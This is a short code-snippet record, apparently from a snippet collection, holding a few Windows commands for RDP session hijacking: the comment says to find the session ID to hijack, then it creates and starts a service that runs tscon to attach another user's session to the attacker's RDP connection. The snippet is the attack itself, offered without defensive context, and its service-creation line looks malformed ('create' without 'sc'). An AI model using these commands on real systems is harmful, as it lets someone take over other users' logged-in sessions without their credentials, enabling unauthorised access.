---
id: 72aab191-e497-45f3-99ef-e42a21c8e888
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:27.375499+00:00'
updated_at: '2023-04-10T20:37:19.882843+00:00'
---

# Code Snippet 72aab191

**Language**: Powershell

```powershell
# get the Session ID you want to hijack
query user
create sesshijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#55"
net start sesshijack
```
